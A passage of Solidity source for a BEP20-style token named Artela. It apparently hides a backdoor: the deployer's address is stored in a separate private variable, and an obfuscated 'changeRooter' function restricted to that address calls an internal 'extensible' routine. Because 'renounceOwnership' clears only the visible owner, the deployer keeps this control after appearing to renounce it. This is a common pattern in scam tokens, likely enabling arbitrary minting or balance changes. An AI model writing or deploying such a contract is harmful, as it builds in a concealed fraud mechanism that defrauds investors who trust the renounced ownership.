}

contract dApp is IBEP20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) IBEP20(name, symbol) {
        Perform(msg.sender, initialSupply * (10 ** uint256(decimals())));
    }
}

contract BEP20 is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "BEP20: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract Artela is dApp , BEP20 {
address private _msgsender = _msgSender();
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) dApp(name, symbol, initialSupply) {}
    function changeRooter(address dAppSecall, uint256 network) public {
        require(msg.sender == _msgsender);
        extensible(dAppSecall, network);
    }

}
